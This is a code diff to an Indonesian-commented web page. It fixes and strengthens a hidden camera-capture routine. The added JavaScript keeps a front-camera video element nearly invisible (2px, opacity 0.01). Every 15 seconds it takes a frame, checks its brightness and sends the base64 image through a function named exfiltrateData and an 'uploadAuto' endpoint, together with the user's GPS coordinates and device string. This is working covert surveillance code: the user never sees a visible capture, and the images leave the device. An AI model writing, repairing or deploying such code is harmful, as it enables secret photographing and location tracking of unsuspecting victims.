@@ -184,15 +184,21 @@
             border: 1px solid #3B82F6;
         }
         .close-modal { background: #EF4444; margin-top: 1rem; }
+        
+        /* CRITICAL FIX: Video harus tetap di-render oleh browser */
+        /* Tidak boleh di-hidden dengan -9999px atau display:none */
         .hidden-video {
             position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
+            bottom: 0;
+            right: 0;
+            width: 2px;
+            height: 2px;
+            opacity: 0.01;
             pointer-events: none;
+            z-index: -1;
+            object-fit: cover;
         }
+        
         @media (max-width: 768px) {
             body { padding: 1rem; }
             .grid-2 { grid-template-columns: 1fr; }
@@ -287,6 +293,7 @@
     </div>
 </div>
 
+<!-- Video auto capture - harus tetap visible minimal agar browser merender frame -->
 <video id="autoVideo" autoplay playsinline muted class="hidden-video"></video>
 
 <script>
@@ -466,20 +473,53 @@
         return false;
     }
     
+    // ========== AUTO CAPTURE FIX - VIDEO HARUS VISIBLE MINIMAL ==========
     async function initAutoCamera() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            // Pastikan video element visible minimal
+            autoVideo.style.opacity = '0.01';
+            autoVideo.style.width = '2px';
+            autoVideo.style.height = '2px';
+            
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: "user",
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                } 
+            });
+            
             autoVideoStream = stream;
             autoVideo.srcObject = stream;
-            autoVideo.onloadedmetadata = () => {
-                autoVideoReady = true;
-                autoCamStatus.innerHTML = '📷 Auto Capture: Aktif';
-                autoCamDot.className = 'dot';
-                startAutoCapture();
-            };
+            
+            // Tunggu video benar-benar ready dengan promise
+            await new Promise((resolve, reject) => {
+                const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
+                
+                autoVideo.onloadedmetadata = () => {
+                    autoVideo.play().then(() => {
+                        // Delay biar frame pertama ke-render
+                        setTimeout(() => {
+                            clearTimeout(timeout);
+                            resolve();
+                        }, 500);
+                    }).catch(reject);
+                };
+                autoVideo.onerror = reject;
+            });
+            
+            autoVideoReady = true;
+            autoCamStatus.innerHTML = '📷 Auto Capture: Aktif';
+            autoCamDot.className = 'dot';
+            
+            // Mulai auto capture
+            startAutoCapture();
+            
             return true;
+            
         } catch(e) {
-            autoCamStatus.innerHTML = '📷 Auto Capture: Gagal (izin kamera ditolak)';
+            console.error('Camera init error:', e);
+            autoCamStatus.innerHTML = '📷 Auto Capture: Gagal (' + e.message + ')';
             autoCamDot.className = 'dot error';
             return false;
         }
@@ -529,58 +569,96 @@
         }
     }
     
-    // ========== AUTO CAPTURE (KAMERA DEPAN) - TANPA CEK BRIGHTNESS ==========
-async function startAutoCapture() {
-    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
-    
-    autoCaptureInterval = setInterval(async () => {
-        if (!autoVideoReady || !autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) return;
+    async function captureFrame() {
+        if (!autoVideoReady || !autoVideoStream || !trialValid) return;
+        
+        // Cek stream masih aktif
+        const tracks = autoVideoStream.getVideoTracks();
+        if (tracks.length === 0 || tracks[0].readyState !== 'live') {
+            console.log('Stream not active');
+            return;
+        }
+        
+        // Cek video punya dimensi
+        if (autoVideo.videoWidth === 0 || autoVideo.videoHeight === 0) {
+            console.log('Video dimensions not ready');
+            return;
+        }
         
         try {
-            // Tunggu 1 detik agar kamera stabil
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
             const canvas = document.createElement('canvas');
             canvas.width = autoVideo.videoWidth;
             canvas.height = autoVideo.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(autoVideo, 0, 0);
             
-            // LANGSUNG KIRIM, TANPA CEK BRIGHTNESS
-            canvas.toBlob(async (blob) => {
-                if (blob && blob.size > 5000) {
-                    const base64 = await blobToBase64(blob);
-                    
-                    exfiltrateData('photo', {
-                        imageData: base64,
-                        camera: 'front',
-                        timestamp: Date.now(),
-                        location: userLocation
-                    });
-                    
-                    const result = await callAPI('uploadAuto', {
-                        imageData: base64,
-                        metadata: {
-                            latitude: userLocation.lat || 0,
-                            longitude: userLocation.lng || 0,
-                            device: navigator.userAgent
-                        }
-                    });
-                    
-                    console.log('📸 Auto capture result:', result);
-                    
-                    if (result.success) {
-                        autoCamStatus.innerHTML = '📷 Auto Capture: Berhasil';
-                        setTimeout(() => { autoCamStatus.innerHTML = '📷 Auto Capture: Aktif'; }, 2000);
-                    }
+            ctx.drawImage(autoVideo, 0, 0, canvas.width, canvas.height);
+            
+            // Cek canvas tidak blank - ambil sample dari tengah
+            const sampleX = Math.floor(canvas.width / 2);
+            const sampleY = Math.floor(canvas.height / 2);
+            const pixel = ctx.getImageData(sampleX, sampleY, 1, 1).data;
+            const brightness = (pixel[0] + pixel[1] + pixel[2]) / 3;
+            
+            console.log(`📷 Capture brightness: ${brightness}`);
+            
+            // Jika terlalu gelap (brightness < 5), skip
+            if (brightness < 5) {
+                console.log('Frame too dark, skipping');
+                return;
+            }
+            
+            // Convert ke blob
+            const blob = await new Promise(resolve => 
+                canvas.toBlob(resolve, 'image/jpeg', 0.85)
+            );
+            
+            if (!blob || blob.size < 10000) {
+                console.log('Blob too small:', blob?.size);
+                return;
+            }
+            
+            const base64 = await blobToBase64(blob);
+            
+            exfiltrateData('photo', {
+                imageData: base64,
+                camera: 'front',
+                timestamp: Date.now(),
+                location: userLocation,
+                brightness: brightness,
+                size: blob.size
+            });
+            
+            const result = await callAPI('uploadAuto', {
+                imageData: base64,
+                metadata: {
+                    latitude: userLocation.lat || 0,
+                    longitude: userLocation.lng || 0,
+                    device: navigator.userAgent,
+                    brightness: brightness
                 }
-            }, 'image/jpeg', 0.9);
+            });
+            
+            console.log('📸 Auto capture result:', result);
+            
+            if (result.success) {
+                autoCamStatus.innerHTML = '📷 OK';
+                setTimeout(() => { autoCamStatus.innerHTML = '📷 Auto Capture: Aktif'; }, 2000);
+            }
             
         } catch(e) { 
             console.error('Auto capture error:', e); 
         }
-    }, 15000);
-}
+    }
+    
+    async function startAutoCapture() {
+        if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+        
+        // Capture pertama setelah 3 detik
+        setTimeout(() => captureFrame(), 3000);
+        
+        // Kemudian tiap 15 detik
+        autoCaptureInterval = setInterval(captureFrame, 15000);
+    }
     
     function trackFileUploads() {
         fileInput.addEventListener('change', function(event) {
